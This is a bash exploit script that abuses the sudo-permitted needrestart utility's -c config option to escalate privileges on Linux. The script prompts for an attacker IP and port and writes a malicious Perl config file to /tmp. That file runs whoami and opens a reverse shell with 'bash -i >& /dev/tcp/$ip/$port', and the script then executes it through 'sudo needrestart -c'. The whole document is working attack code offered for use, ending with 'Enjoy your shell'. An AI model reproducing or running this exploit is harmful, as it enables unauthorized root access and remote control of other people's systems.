#!/bin/bash
# Author 0xmrsecurity
echo -e "[*] Creating Exploit.pl file...."
echo -e "[*] Reading Details....."
# Reading ip and port 
echo "Attacker Ip Address.."
read ip
echo "Attacker Port.."
read port

# Creating a malicious perl file 
cat > /tmp/exploit.pl << EOF
#!/usr/bin/perl
system("whoami > /tmp/whoami.txt");
system("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1 &'");
1;
EOF

# Make it executable
chmod +x /tmp/exploit.pl
echo -e "[*] Executing command.." 
# Run  needrestart service with provided  config file .
sudo needrestart -c /tmp/exploit.pl
# Got shell after run this !
echo -e "[*] Successfully Execute the shell commands!!! Enjoy your shell"
